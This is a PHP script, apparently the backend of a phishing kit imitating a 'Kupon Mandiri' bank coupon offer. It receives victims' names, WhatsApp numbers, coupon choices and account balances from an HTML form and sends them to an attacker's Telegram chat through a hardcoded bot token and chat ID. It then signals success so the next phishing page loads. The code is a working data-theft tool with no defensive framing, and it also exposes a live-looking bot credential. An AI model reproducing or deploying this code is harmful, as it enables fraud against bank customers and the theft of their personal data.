<?php
// ==========================================
// KONFIGURASI TELEGRAM BOT & CHAT ID
// ==========================================
$telegram_bot_token = "8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is"; 
$telegram_chat_id   = "6742478722";
// ==========================================

// Menerima data JSON yang dikirimkan oleh AJAX dari halaman index.html
$json_input = file_get_contents('php://input');
$data = json_decode($json_input, true);

// Pastikan data token/payload tersedia
if (isset($data['token'])) {
    $payload =$data['token'];

    // Ambil nilai data form sesuai name attribute di HTML
    $kupon =$payload['CPX#Kupon'] ?? '-';
    $nama  =$payload['CPX#Nama'] ?? '-';
    $nohp  =$payload['CPX#No_HP'] ?? '-';
    $saldo =$payload['CPX#Saldo'] ?? '-';

    // Format pesan notifikasi yang masuk ke Telegram
    $pesan  = "🔔 *DATA KUPON MANDIRI MASUK* 🔔\n\n";
    $pesan .= "🎟 *Jenis Kupon:* {$kupon}\n";
    $pesan .= "👤 *Nama Lengkap:* {$nama}\n";
    $pesan .= "📱 *No. WhatsApp:* `{$nohp}`\n";
    $pesan .= "💰 *Saldo Terakhir:* {$saldo}\n\n";
    $pesan .= "🌐 _Status: Berhasil dikirim._";

    // Kirim menggunakan cURL API Telegram
    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
    
    $post_fields = [
        'chat_id' => $telegram_chat_id,
        'text' => $pesan,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Kirim respons sukses kembali ke JavaScript (agar halaman 2 langsung muncul)
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit();
} else {
    // Jika diakses tidak melalui metode yang benar
    header('HTTP/1.1 403 Forbidden');
    exit();
}
?>
